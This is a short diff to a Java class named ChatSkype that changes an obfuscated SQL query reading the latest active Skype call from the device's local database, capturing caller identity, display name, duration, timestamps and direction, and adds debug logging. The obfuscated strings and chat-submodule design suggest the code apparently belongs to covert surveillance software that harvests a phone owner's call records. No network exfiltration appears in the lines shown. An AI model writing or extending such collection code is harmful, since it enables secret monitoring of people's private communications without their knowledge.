@@ -392,7 +392,7 @@ public class ChatSkype extends SubModuleChat {
 
 	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
 		// select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1
-		String sqlQuery= M.e("select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id and is_active = 1 order by cm.start_timestamp desc limit 1");
+		String sqlQuery= M.e("select ca.id,identity,dispname,call_duration,cm.type,cm.creation_timestamp,is_incoming,ca.begin_timestamp from callmembers as cm join calls as ca on cm.call_db_id = ca.id and is_active = 1 order by cm.creation_timestamp desc limit 1");
 
 		RecordVisitor visitor = new RecordVisitor() {
 
@@ -403,14 +403,20 @@ public class ChatSkype extends SubModuleChat {
 				callInfo.displayName = cursor.getString(2);
 				int type = cursor.getInt(4);
 				callInfo.timestamp = new Date(cursor.getLong(5));
+
 				callInfo.incoming = cursor.getInt(6) == 1;
 				callInfo.valid = true;
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getCurrentCall), timestamp: " + cursor.getLong(5) + " -> "+ callInfo.timestamp + "begin: " + cursor.getInt(7));
+				}
 
 				return callInfo.id;
 			}
 		};
 
 		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
+
 		return callInfo.valid;
 	}
 
